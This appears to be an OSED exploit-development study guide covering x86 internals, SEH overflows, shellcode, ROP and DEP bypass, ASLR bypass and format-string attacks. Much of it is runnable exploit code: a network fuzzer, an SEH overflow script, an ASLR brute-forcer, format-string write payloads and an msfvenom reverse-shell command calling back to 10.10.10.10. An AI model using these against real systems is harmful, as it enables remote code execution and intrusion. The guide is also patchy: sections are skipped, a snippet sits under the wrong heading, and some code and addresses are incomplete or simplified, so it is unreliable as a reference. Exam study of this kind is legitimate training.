1. x86 Architecture

The entire OSED scope is 32-bit x86. Understanding registers, calling conventions, stack mechanics, and the process memory layout is the foundation for every exploit technique that follows.

1.1 General-Purpose Registers

Eight 32-bit GPRs, each addressable as 16-bit (AX) and 8-bit (AH/AL) sub-registers.

RegisterCommon NameExploitation Role
EAXAccumulatorReturn values; first checked after API calls; ROP pivot target
EBXBaseGeneral scratch; often preserved across calls (callee-saved)
ECXCounterLoop counter (REP, LOOP); this pointer in thiscall
EDXDataI/O operations; upper 32 bits of 64-bit multiply/divide result
ESISource IndexSource pointer for string ops (MOVS, CMPS); egghunter scanning
EDIDestination IndexDestination pointer for string ops; shellcode decode destination
ESPStack PointerTop of stack (lowest address); shellcode landing zone after overflow
EBPBase PointerFrame pointer; offset from EBP locates locals and saved return address

1.2 EIP, Segment Registers & EFLAGS

EIP (instruction pointer) holds the address of the next instruction to execute. Hijacking EIP is the fundamental goal of every overflow. You cannot MOV into EIP directly — it is set implicitly by CALL, RET, JMP, and interrupts.

RegisterPurpose
EIPInstruction pointer — controls execution flow; overwriting this = code execution
CSCode segment selector — defines executable code region
DSData segment selector — default segment for data access
SSStack segment selector — defines stack region
ESExtra segment — destination for string operations
FSPoints to TEB (Thread Environment Block) on Windows; PEB walk starts at FS:[0x30]
GSAdditional segment; used by 64-bit Windows for TEB (not relevant in 32-bit OSED scope)

EFLAGS is a 32-bit register where individual bits are status flags set by arithmetic and comparison instructions.

FlagBitSet WhenExploit Relevance
ZF (Zero)6Result is zeroDrives JZ/JNZ branches; TEST EAX,EAX + JNZ is the standard null check in shellcode
CF (Carry)0Unsigned overflowSignals failure in some syscalls; used in egghunter page-validity checks
SF (Sign)7Result is negativeSigned comparison branches (JL, JGE)
OF (Overflow)11Signed overflowInteger overflow detection
DF (Direction)10Set by STDControls string-op direction; CLD clears it for forward scanning (required before SCASD in egghunters)
TF (Trap)8Single-step modeUsed by debuggers for single-stepping; anti-debug checks test this

1.4 Stack Layout

The stack grows from high addresses toward low. A function prologue saves the old frame pointer and allocates local space; the epilogue tears it down.

// Function prologue (compiler-generated)
// push ebp          ; save caller's frame pointer
// mov  ebp, esp     ; set new frame base
// sub  esp, 0x40    ; allocate 64 bytes for locals

// Stack after prologue (high addr at top):
// [ebp+0x0C]  arg2
// [ebp+0x08]  arg1
// [ebp+0x04]  return address  <-- target of overflow
// [ebp+0x00]  saved EBP
// [ebp-0x04]  local_var1
// [ebp-0x40]  local_buffer[64] <-- overflow starts here

// Function epilogue:
// mov  esp, ebp     ; deallocate locals
// pop  ebp          ; restore caller's frame
// ret               ; pop return address into EIP

1.5 Process Memory Layout

A 32-bit Windows process uses a 4 GB virtual address space (2 GB user / 2 GB kernel by default).

# Memory map (low to high):
# 0x00000000  ---- NULL page (access violation) ----
# 0x00010000  .text    (code, R-X)    executable instructions
# 0x00020000  .rdata   (read-only data, R--)  strings, import table
# 0x00030000  .data    (initialized globals, RW-)
# 0x00040000  .bss     (uninitialized globals, RW-)
#     ...     Heap     (grows UP, RW-)  malloc / HeapAlloc
#     ...     [loaded DLLs, mapped files]
# 0x7FFE0000  SharedUserData (KUSER_SHARED_DATA)
# 0x7FFxxxxx  Stack    (grows DOWN, RW-)  locals, return addrs
# 0x80000000  ---- Kernel space (inaccessible from user mode) ----

Key exploitation implications: the stack holds the return addresses you overwrite; the heap can hold shellcode for egghunter retrieval; .text sections contain executable gadgets for ROP; .data provides writable locations for ROP output parameters.

1.6 Common Instructions for Exploit Dev

A small vocabulary of x86 instructions covers most of what you encounter in disassembly and need to write in shellcode.

// Data movement
mov  eax, ebx        // eax = ebx
mov  eax, [ebx]      // eax = value at address in ebx (dereference)
mov  [eax], ecx      // write ecx to address in eax
lea  eax, [ebp-0x8]  // load effective address (no memory read)
xchg eax, esp        // swap EAX and ESP (stack pivot gadget)

// Stack operations
push eax             // esp -= 4; [esp] = eax
pop  ecx             // ecx = [esp]; esp += 4
pushad               // push all 8 GPRs (EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI)
popad                // pop all 8 GPRs

// Arithmetic / Logic
xor  eax, eax        // eax = 0  (null-free zeroing)
add  esp, 0x10       // stack adjustment (skip bytes)
sub  esp, 0x40       // allocate stack space
inc  eax             // eax += 1
dec  ecx             // ecx -= 1
neg  eax             // eax = -eax (two's complement)
not  eax             // eax = ~eax (bitwise NOT)

// Control flow
call eax             // push return addr; jmp eax
jmp  esp             // classic redirect after EIP overwrite
ret                  // pop eip (ROP glue)
retn 4               // pop eip; esp += 4 (stdcall cleanup)
jmp  short 0x06      // relative short jump (2-byte, +/- 127)
jnz  label           // jump if ZF=0

// Comparison / Testing
test eax, eax        // AND without storing; sets ZF if eax=0
cmp  eax, ebx        // subtract without storing; sets flags
rep  scasd           // compare EAX with [EDI], repeat ECX times

// System
int  0x2e            // legacy Windows syscall gate (egghunters)
int  0x03            // software breakpoint (INT3)
nop                  // 0x90, one-byte no-op (NOP sled filler)

1.7 Endianness & Address Packing

x86 is little-endian: the least significant byte is stored at the lowest address. When you overwrite EIP with address 0x10090c83, the bytes in memory are \x83\x0c\x09\x10. Python’s struct.pack("<I", addr) handles this automatically.

import struct

addr = 0x10090c83
packed = struct.pack("<I", addr)
print(packed)           # b'\x83\x0c\x09\x10'
print(packed.hex())     # 830c0910

# Unpack bytes back to integer
val = struct.unpack("<I", b"\x83\x0c\x09\x10")[0]
print(f"0x{val:08x}")  # 0x10090c83

# Common pattern: pack address into exploit buffer
jmp_esp = struct.pack("<I", 0x10090c83)
payload = b"A" * 524 + jmp_esp + b"\x90" * 16 + shellcode

3. Stack Buffer Overflows

The classic exploit: overflow a local buffer on the stack to overwrite the saved return address, redirecting EIP to attacker-controlled shellcode.

3.1 Fuzzing & Crash Discovery

Send incrementally larger payloads to each input vector until the target crashes. Record the exact size that triggers the access violation.

#!/usr/bin/env python3
"""Basic TCP fuzzer - send growing buffers until crash."""
import socket
import time
import sys

target_ip   = "192.168.1.100"
target_port = 9999

buffer_size = 100
increment   = 100
max_size    = 5000

while buffer_size <= max_size:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, target_port))
        s.recv(1024)

        payload = b"A" * buffer_size
        print(f"[*] Sending {buffer_size} bytes...")
        s.send(payload + b"\r\n")
        s.recv(1024)
        s.close()
    except Exception as e:
        print(f"[!] Crashed at {buffer_size} bytes: {e}")
        sys.exit(0)

    buffer_size += increment
    time.sleep(1)

print("[-] Target survived all sizes.")

4. SEH-Based Overflows

When a stack overflow is caught by Structured Exception Handling before the function returns, you cannot simply overwrite the saved return address. Instead, overwrite the SEH handler pointer on the stack to hijack exception dispatch.

4.1 SEH Chain Explained

Each thread maintains a linked list of _EXCEPTION_REGISTRATION_RECORD structures on the stack. Each record contains a pointer to the next record (nSEH) and a pointer to the handler function. When an exception fires, the OS walks the chain and calls each handler until one handles it.

// SEH record on the stack (8 bytes)
typedef struct _EXCEPTION_REGISTRATION_RECORD {
    struct _EXCEPTION_REGISTRATION_RECORD *Next;  // nSEH: +0x00
    PEXCEPTION_ROUTINE                     Handler; // SEH:  +0x04
} EXCEPTION_REGISTRATION_RECORD;

// Stack layout after overflow:
// [buffer padding ...]
// nSEH  (4 bytes) -- overwrite with short JMP forward
// SEH   (4 bytes) -- overwrite with POP POP RET gadget
// [shellcode lands here, after the short jump]

4.2 SEH Exploit Technique

The exploit flow: (1) overflow triggers exception, (2) OS dispatches to our overwritten SEH handler (POP POP RET), (3) POP POP RET lands execution at nSEH, (4) nSEH contains a short JMP that hops forward into the shellcode.

#!/usr/bin/env python3
"""SEH-based buffer overflow exploit skeleton."""
import socket
import struct

target_ip   = "192.168.1.100"
target_port = 9999

seh_offset = 988                        # offset to nSEH (found via pattern)

# POP POP RET gadget (from non-SafeSEH module)
# !py mona seh -m "module.dll"
pop_pop_ret = struct.pack("<I", 0x1001a1a2)

# Short JMP forward: EB 06 = jump 6 bytes ahead (over SEH + alignment)
nseh = b"\xeb\x06\x90\x90"

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 \
#   -f python -v shellcode -b "\x00\x0a\x0d"
shellcode = b"\x90" * 16               # NOP sled
shellcode += b"\xdb\xce\xd9\x74\x24"  # example encoder stub
# ... full shellcode ...

payload  = b"A" * seh_offset            # fill to nSEH
payload += nseh                         # overwrite nSEH: short JMP
payload += pop_pop_ret                  # overwrite SEH handler
payload += shellcode                    # shellcode after SEH record

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.recv(1024)
s.send(payload + b"\r\n")
s.close()
print("[+] SEH exploit sent.")

4.4 SafeSEH & SEHOP Bypass

SafeSEH validates that the handler address is in the module’s registered handler table. Bypass by using a gadget from a module compiled without SafeSEH (check with !py mona modules). SEHOP (SEH Overwrite Protection) validates the chain integrity by checking that the last record points to ntdll!FinalExceptionHandler. SEHOP is harder to bypass; the main strategy is to find a partial overwrite or a module that does not have SEHOP enforced.

SEHOPValidates entire SEH chain integrity before dispatchingReconstruct a valid chain, or use a non-SEHOP module; partial overwrite
Stack Cookie (/GS)Canary value between buffer and return address; checked before RETSEH overwrite triggers exception before the cookie check runs

5. Egghunters

When the buffer space available after EIP/SEH overwrite is too small for shellcode, use an egghunter: a tiny stub (32 bytes) that searches all of process memory for a unique tag prepended to the real shellcode placed elsewhere.

5.1 When to Use

Use an egghunter when: (1) the overflow buffer is small (under ~300 bytes after control), (2) the full shellcode can be placed in a different input field or protocol command that the application stores somewhere in memory, and (3) you can prepend a known 8-byte egg tag to that shellcode.

6. Custom Shellcode

OSED requires writing position-independent shellcode from scratch. The core technique is walking the PEB to find loaded DLL base addresses, then resolving function addresses through the export table.

6.1 PEB Walking — Finding kernel32.dll

The Process Environment Block (PEB) is always accessible via FS:[0x30]. From the PEB, walk the InMemoryOrderModuleList to find kernel32.dll’s base address.

// PEB walk to find kernel32.dll base address
// FS:[0x30]          -> PEB
// PEB+0x0C           -> PEB_LDR_DATA
// PEB_LDR_DATA+0x14  -> InMemoryOrderModuleList (LIST_ENTRY)
// First entry:  ntdll.dll
// Second entry: kernel32.dll (or kernelbase.dll on Win7+)

// Assembly:
// xor  ecx, ecx
// mov  eax, fs:[ecx+0x30]    ; EAX = PEB
// mov  eax, [eax+0x0c]       ; EAX = PEB->Ldr
// mov  esi, [eax+0x14]       ; ESI = InMemoryOrderModuleList.Flink

// xchg eax, esi
// lodsd                       ; EAX = second entry (kernel32)
// mov  ebx, [eax+0x10]       ; EBX = kernel32 base address

6.2 Resolving GetProcAddress

With kernel32.dll’s base address, parse its PE export table to find GetProcAddress. Then use GetProcAddress to resolve any other function.

// PE export table parsing:
// base + 0x3C                 -> e_lfanew (PE header offset)
// base + e_lfanew + 0x78      -> Export Directory RVA
// Export Dir + 0x1C           -> AddressOfFunctions RVA
// Export Dir + 0x20           -> AddressOfNames RVA
// Export Dir + 0x24           -> AddressOfNameOrdinals RVA

// Algorithm:
// 1. Walk AddressOfNames array, hash/compare each name
// 2. When "GetProcAddress" found at index i
// 3. Read ordinal from AddressOfNameOrdinals[i]
// 4. Read function RVA from AddressOfFunctions[ordinal]
// 5. Function address = base + RVA
# Python helper: compute ROR13 hash of a function name
def ror13_hash(name):
    """ROR13 hash used in shellcode to match function names."""
    h = 0
    for c in name:
        h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
        h = (h + ord(c)) & 0xFFFFFFFF
    return h

7. DEP Bypass (ROP)

Data Execution Prevention (DEP) marks the stack as non-executable. Return-Oriented Programming (ROP) chains together small instruction sequences ending in RET (gadgets) already in executable memory to call a Win32 API that disables DEP for the shellcode region.

7.1 Understanding DEP

When DEP is enabled, executing code on the stack triggers an access violation. The bypass strategy is to never execute on the stack directly. Instead, use ROP gadgets in existing executable code (.text sections of loaded DLLs) to set up a call to VirtualProtect or VirtualAlloc that marks the shellcode region as executable.

# Check if DEP is enabled for the process
!vprot esp                            # should show PAGE_READWRITE (not EXECUTE)
!address -f:Stack                     # shows stack regions and protection

# Verify a module's .text section is executable
!address 0x10001000                   # should show PAGE_EXECUTE_READ

7.3 VirtualProtect ROP Chain

VirtualProtect changes the memory protection of an existing page. The ROP chain sets up the four arguments on the stack then calls the function.

# lpAddress      = address of shellcode (ESP at time of call)
# dwSize         = 0x201 (size to mark executable)
# flNewProtect   = 0x40 (PAGE_EXECUTE_READWRITE)
# lpflOldProtect = writable address for old protection value

# Gadget addresses (from non-ASLR module):

7.6 The PUSHAD Technique

PUSHAD pushes all 8 general-purpose registers onto the stack in order: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI. By pre-loading registers with VirtualProtect arguments, a single PUSHAD; RET gadget sets up the entire API call frame. The pushed ESP value becomes lpAddress (pointing to the shellcode that follows), and the pushed ESI (containing the VirtualProtect address) becomes the return address that RET pops into EIP.

# Stack after PUSHAD (top = ESP, bottom = first pushed):
#   [ESP+0x00]  EDI   -- return addr after VirtualProtect (NOP sled)
#   [ESP+0x04]  ESI   -- VirtualProtect address (called via RET)
#   [ESP+0x08]  EBP   -- (don't care)
#   [ESP+0x0C]  ESP   -- lpAddress (points to shellcode below)
#   [ESP+0x10]  EBX   -- dwSize
#   [ESP+0x14]  EDX   -- flNewProtect (0x40)
#   [ESP+0x18]  ECX   -- lpflOldProtect (writable addr)
#   [ESP+0x1C]  EAX   -- (NOP slide / JMP ESP)

# Use exactly 2 bytes instead of 4 to keep the high bytes intact
import struct
partial = struct.pack("<H", 0xABCD)   # only 2 bytes
# payload = filler + partial  (NOT a full 4-byte overwrite)

8.3 Information Disclosure

Leak a pointer from the process (via format string, out-of-bounds read, or application error message) to calculate the randomized base address at runtime, then compute gadget addresses dynamically.

#!/usr/bin/env python3
"""ASLR bypass via information leak."""
import socket
import struct

def leak_address(sock):
    """Trigger an info leak to get a module pointer."""
    sock.send(b"LEAK_CMD\r\n")
    response = sock.recv(4096)
    # Parse leaked pointer from response (application-specific)
    leaked = struct.unpack("<I", response[offset:offset+4])[0]
    return leaked

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 9999))

leaked_ptr = leak_address(s)
module_base = leaked_ptr - 0x12345     # subtract known offset
jmp_esp     = module_base + 0x0c83     # compute gadget address

print(f"[+] Leaked: 0x{leaked_ptr:08x}")
print(f"[+] Base:   0x{module_base:08x}")
print(f"[+] JMP ESP: 0x{jmp_esp:08x}")

# Now build exploit with computed addresses
payload = b"A" * 524 + struct.pack("<I", jmp_esp) + shellcode

8.4 Brute Force (32-bit)

On 32-bit systems ASLR entropy is low (typically 8 bits for DLLs = 256 possible bases). A network service that restarts after crash can be brute-forced in a few minutes.

#!/usr/bin/env python3
"""ASLR brute force (32-bit, low entropy)."""
import socket
import struct
import time

target_ip   = "192.168.1.100"
target_port = 9999

# Guess the base address (only high bytes change)
# Known gadget offset within module: 0x00010c83
gadget_offset = 0x00010c83

# Typical ASLR bases cycle through ~256 values
for attempt in range(1, 300):
    # Common base: 0x10XX0000 where XX varies
    guessed_base = 0x10000000 + (attempt * 0x10000)
    jmp_esp = guessed_base + gadget_offset

    # Skip if address contains bad chars
    addr_bytes = struct.pack("<I", jmp_esp)
    if b"\x00" in addr_bytes or b"\x0a" in addr_bytes:
        continue

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((target_ip, target_port))
        s.recv(1024)

        payload = b"A" * 524 + addr_bytes + b"\x90" * 16 + shellcode
        s.send(payload + b"\r\n")
        s.close()
        print(f"[*] Attempt {attempt}: base=0x{guessed_base:08x}")
    except:
        print(f"[!] Attempt {attempt}: connection failed (crash or success?)")
        break

    time.sleep(0.5)

9. Format String Attacks

When user input is passed directly as the format string to printf/sprintf/fprintf, the attacker controls format specifiers to read from and write to arbitrary memory.

9.1 Reading from the Stack

Each %x pops a DWORD from the stack. By using %N$x (direct parameter access), you can read any stack position without consuming all the ones before it.

# Read sequential DWORDs from the stack
printf "AAAA.%08x.%08x.%08x.%08x.%08x" | nc target 9999
# Output: AAAA.deadbeef.cafebabe.12345678.41414141.0012fc00
#                                         ^^^^^^^^ = our "AAAA"

# Direct parameter access (read 5th DWORD directly)
printf "AAAA.%5\$08x" | nc target 9999
# Output: AAAA.41414141

# Read a string from a stack pointer
printf "%5\$s" | nc target 9999

9.2 Arbitrary Write with %n

The %n specifier writes the number of characters printed so far to the address pointed to by the corresponding argument. If the attacker controls a stack DWORD with a target address, %n writes to that address.

#!/usr/bin/env python3
"""Format string arbitrary write (%n)."""
import struct

target_addr = 0x0041a3b0               # address to overwrite (e.g., GOT entry)
value       = 0x10090c83               # value to write (e.g., JMP ESP address)

# Split into two 16-bit writes (DWORD write at once is impractical)
low_half  = value & 0xFFFF             # 0x0c83
high_half = (value >> 16) & 0xFFFF    # 0x1009

# Place target addresses on stack (overwrite low and high halves)
payload  = struct.pack("<I", target_addr)       # write low half here
payload += struct.pack("<I", target_addr + 2)   # write high half here

# Calculate padding for %n writes
# Assume our addresses start at stack offset 5
# Already printed: 8 bytes (the two addresses)
pad_low  = low_half - 8
pad_high = high_half - low_half

payload += f"%{pad_low}x".encode()     # pad to low_half total chars
payload += b"%5$hn"                     # write low half (short write)
payload += f"%{pad_high}x".encode()    # pad to high_half total chars
payload += b"%6$hn"                     # write high half

print(f"Payload length: {len(payload)}")
print(f"Writing 0x{value:08x} to 0x{target_addr:08x}")

9.4 DWORD Writes vs Short Writes

A %n writes a full 4-byte integer (number of chars printed). A %hn writes only 2 bytes (short). Short writes are preferred because the padding needed is at most 65535 characters instead of billions. Two %hn writes can construct any 4-byte value.

# DWORD write: %n writes 4 bytes (requires printing N chars total)
# Short write: %hn writes 2 bytes (max 65535 chars padding)
# Byte write:  %hhn writes 1 byte (max 255 chars padding) -- not always supported

# Strategy for short writes:
# 1. Write lower 2 bytes first (smaller value first to avoid wrap issues)
# 2. Write upper 2 bytes second
# If high_half < low_half, write high first, then low
# Use modular arithmetic: if the next value is smaller than chars already
# printed, add 0x10000 and it wraps correctly for %hn

9.5 Format String Exploit Skeleton

#!/usr/bin/env python3
"""Format string exploit: overwrite saved return address on stack."""
import socket
import struct

target_ip   = "192.168.1.100"
target_port = 9999

# Target: overwrite saved return address with JMP ESP address
ret_addr    = 0x0012fc48               # stack address of saved EIP
jmp_esp     = 0x10090c83               # JMP ESP gadget

# Split target value into two 16-bit halves
low  = jmp_esp & 0xFFFF               # 0x0c83
high = (jmp_esp >> 16) & 0xFFFF      # 0x1009

# Build format string payload
# Place target addresses at known stack positions
payload  = struct.pack("<I", ret_addr)       # writes low half here
payload += struct.pack("<I", ret_addr + 2)   # writes high half here

# Calculate padding (assume addresses start at stack position 7)
already_printed = 8                     # 8 bytes for the two addresses

# Write smaller value first
if low <= high:
    pad1 = low - already_printed
    pad2 = high - low
    payload += f"%{pad1}x".encode()
    payload += b"%7$hn"                 # write low half
    payload += f"%{pad2}x".encode()
    payload += b"%8$hn"                 # write high half
else:
    pad1 = high - already_printed
    pad2 = low - high
    payload += f"%{pad1}x".encode()
    payload += b"%8$hn"                 # write high half first
    payload += f"%{pad2}x".encode()
    payload += b"%7$hn"                 # write low half

# Append shellcode after the format string (lands after ret addr on stack)
shellcode = b"\x90" * 16 + b"\xcc" * 200  # placeholder

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.recv(1024)

s.close()

10.6 Common Disassembly Patterns

Recognizing these patterns in disassembly helps identify vulnerabilities quickly.

// Pattern 1: Unbounded buffer copy (vulnerable)
// lea  eax, [ebp-0x100]    ; local buffer (256 bytes)
// push eax                  ; destination
// push [ebp+0x08]           ; source (user input, no size check)
// call strcpy               ; overflow if input > 256 bytes

// Pattern 2: Bounded copy (safe)
// push 0x100               ; max size
// push [ebp+0x08]          ; source
// lea  eax, [ebp-0x100]
// push eax                 ; destination
// call strncpy             ; bounded, safe

// Pattern 3: Stack cookie check
// mov  ecx, [ebp-0x04]     ; load cookie from stack
// xor  ecx, ebp            ; XOR with frame pointer
// call __security_check_cookie  ; validate (crash if corrupted)
// ; SEH exploit bypasses this: exception fires BEFORE cookie check

// Pattern 4: Format string vulnerability
// push [ebp+0x08]          ; user-controlled string
// call printf              ; NO format string argument!
// ; Should be: push [ebp+0x08]; push fmt_string; call printf

// Pattern 5: Integer overflow leading to heap overflow
// mov  eax, [ebp+0x08]     ; user-controlled size
// add  eax, 0x10           ; add header size (can wrap to small value!)
// push eax
// call malloc              ; allocates tiny buffer
// ; Then memcpy copies full user size into tiny buffer

10.7 PE File Structure Reference

Understanding PE (Portable Executable) headers is essential for locating exports, imports, and section permissions.

// PE file structure (key offsets for exploit dev):
// Offset 0x00: DOS Header
//   e_magic  = "MZ" (0x5A4D)
//   e_lfanew = offset to PE header (at DOS_HEADER+0x3C)

// PE Header (at e_lfanew):
//   Signature       = "PE\0\0" (0x00004550)
//   FileHeader      (20 bytes): Machine, NumberOfSections, ...
//   OptionalHeader:
//     +0x1C  AddressOfEntryPoint
//     +0x34  ImageBase (preferred load address)
//     +0x46  DllCharacteristics:
//              0x0040 = DYNAMIC_BASE (ASLR)
//              0x0100 = NX_COMPAT (DEP)
//     +0x60  DataDirectory[0]  = Export Table RVA + Size
//     +0x68  DataDirectory[1]  = Import Table RVA + Size

// Section Headers (after OptionalHeader):
//   .text   -- executable code (R-X)
//   .rdata  -- read-only data, import/export tables (R--)
//   .data   -- initialized globals (RW-)
//   .rsrc   -- resources (R--)
#!/usr/bin/env python3
"""Quick PE header parser to check ASLR/DEP flags."""
import struct

def check_pe(filepath):
    with open(filepath, "rb") as f:
        # Read DOS header
        f.seek(0x3C)
        pe_offset = struct.unpack("<I", f.read(4))[0]

        # Read PE signature
        f.seek(pe_offset)
        sig = f.read(4)
        assert sig == b"PE\x00\x00", "Not a valid PE file"

        # Read DllCharacteristics (OptionalHeader + 0x46)
        # COFF header is 20 bytes after signature
        f.seek(pe_offset + 4 + 20 + 0x46)
        dll_chars = struct.unpack("<H", f.read(2))[0]

        aslr = bool(dll_chars & 0x0040)
        dep  = bool(dll_chars & 0x0100)

        # ImageBase
        f.seek(pe_offset + 4 + 20 + 0x1C)
        image_base = struct.unpack("<I", f.read(4))[0]

        print(f"ImageBase: 0x{image_base:08x}")
        print(f"ASLR (DYNAMIC_BASE): {aslr}")
        print(f"DEP  (NX_COMPAT):    {dep}")
        print(f"DllCharacteristics:  0x{dll_chars:04x}")

check_pe("C:\\target\\module.dll")
